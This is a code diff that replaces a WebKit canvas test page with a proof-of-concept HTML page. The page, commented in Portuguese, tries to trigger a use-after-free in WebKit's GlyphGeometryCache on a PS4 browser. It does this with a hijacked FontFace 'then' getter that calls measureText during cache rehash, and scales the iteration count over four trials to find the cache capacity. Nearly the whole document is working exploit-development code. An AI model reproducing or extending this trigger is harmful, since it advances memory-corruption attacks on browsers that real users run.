@@ -1,43 +1,107 @@
 <!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"></head>
+<body>
+<pre id="log"></pre>
 <script>
-function gc() {
-    for (let i = 0; i < 10000; i++)
-        new String("abc");
+// UAF GlyphGeometryCache rehash — iteracoes escaladas para PS4
+//
+// Getter confirmado: local(Arial/Helvetica/Times/serif) + Cherokee → getter:true
+// Mas sem crash: 16 iteracoes (32 measureText) insuficientes para rehash no PS4
+//
+// GlyphGeometryCache e um HashMap. Rehash ocorre quando entries > capacity * loadFactor.
+// PS4 pode ter capacity inicial maior (128 ou 256 vs ~64 upstream).
+// Solucao: usar strings UNICAS por iteracao para maximizar entradas distintas no cache.
+//
+// Progressao testada:
+//   T1: 50 iteracoes  (100 measureText no getter) — entradas unicas: ~100
+//   T2: 100 iteracoes (200 measureText)           — entradas unicas: ~200
+//   T3: 200 iteracoes (400 measureText)           — entradas unicas: ~400
+//   T4: 500 iteracoes (1000 measureText)          — entradas unicas: ~1000
+//
+// Se T1 crasha: capacidade inicial do PS4 e < 100 entradas
+// Se T2 crasha: capacidade entre 100-200
+// etc.
+
+var out = document.getElementById('log');
+function log(s) { out.textContent += s + '\n'; }
+
+var ctx = null;
+var inGetter = false;
+var currentIter = 0;
+var getterFired = false;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+        if (inGetter || !ctx) return undefined;
+        inGetter = true;
+        getterFired = true;
+        // Strings UNICAS por iteracao — cada uma insere entrada DIFERENTE
+        // no GlyphGeometryCache, maximizando o crescimento do bucket array
+        for (var i = 0; i < currentIter; i++) {
+            // String com indice garante unicidade
+            try { ctx.measureText('q' + i + String.fromCharCode(65 + (i % 26)) + 'z'); } catch(e) {}
+            try { ctx.measureText(String.fromCharCode(48 + (i % 10)) + 'x' + i);         } catch(e) {}
+        }
+        inGetter = false;
+        return undefined;
+    }
+});
+
+function attempt(n, font) {
+    getterFired = false;
+    for (var d = 0; d < 3; d++)
+        new FontFace('Dummy' + n + '_' + d + '_' + currentIter, 'local(' + font + ')');
+
+    var family = 'VarFam' + n + '_' + currentIter;
+    var face = new FontFace(family, 'local(' + font + ')');
+    void face.loaded;
+    document.fonts.add(face);
+
+    var canvas = document.createElement('canvas');
+    canvas.width = 10; canvas.height = 10;
+    ctx = canvas.getContext('2d');
+    ctx.font = '20px ' + font + ', ' + family;
+
+    // Pre-calls com strings unicas para popular o cache antes do trigger
+    // Assim o cache esta mais proximo da capacidade quando o getter dispara
+    for (var i = 0; i < 50; i++)
+        ctx.measureText('pre' + i + 'x');
+
+    // Cherokee → nao coberto por primary → VarFam → getter dispara
+    ctx.measureText('\u13A0\u13A2\u13A4');
+    return getterFired;
 }
 
-function enter(outer, inner) {
-    let canvas = document.createElement("canvas");
-    let innerCtx;
-    let outerCtx = canvas.getContext(outer, {
-        get colorSpace() { innerCtx = canvas.getContext(inner); return "srgb"; },
-        get alpha() { innerCtx = canvas.getContext(inner); return true; },
-    });
-    document.write(`${name(innerCtx)}<br>`);
+function runTest(label, iters, font) {
+    currentIter = iters;
+    log('--- ' + label + ' (' + (iters * 2) + ' measureText no getter) ---');
+    log('    [EXECUTANDO] <<<');
+    var fired = false;
+    try {
+        for (var n = 0; n < 3; n++) {
+            try { fired = attempt(n, font) || fired; } catch(e) {}
+        }
+    } catch(e) {}
+    log('    PASSOU  |  getter: ' + fired + '\n');
 }
 
-function reenter(outer, inner) {
-    let canvas = document.createElement("canvas");
-    canvas.width = 10;
-    canvas.height = 10;
-    let innerCtx;
-    let outerCtx = canvas.getContext(outer, { 
-        get colorSpace() { innerCtx = canvas.getContext(inner); return "srgb"; },
-        get alpha() { innerCtx = canvas.getContext(inner); return true; },
-    });
-    document.write(`${name(outerCtx)}<br>`);
-}
+window.onload = function() {
+    setTimeout(function() {
 
-function name(ctx) {
-    return ctx ? ctx.constructor.name : "null";
-}
+        // Usando Arial (confirmado que getter dispara)
+        runTest('T1: Arial + 50 iter (100 measureText)', 50, 'Arial');
+        runTest('T2: Arial + 100 iter (200 measureText)', 100, 'Arial');
+        runTest('T3: Arial + 200 iter (400 measureText)', 200, 'Arial');
+        runTest('T4: Arial + 500 iter (1000 measureText)', 500, 'Arial');
 
-for (let outer of ["2d", "bitmaprenderer"])
-    for (let inner of ["2d", "bitmaprenderer"])
-        enter(outer, inner);
+        log('=== FIM ===');
+        log('Se todos passaram: GlyphGeometryCache do PS4 tem capacidade > 1000 entradas');
+        log('ou o mecanismo de rehash e diferente desta versao do WebKit.');
 
-for (let outer of ["2d", "bitmaprenderer"])
-    for (let inner of ["2d", "bitmaprenderer"])
-        reenter(outer, inner);
-
-gc();
+    }, 0);
+};
 </script>
+</body>
+</html>
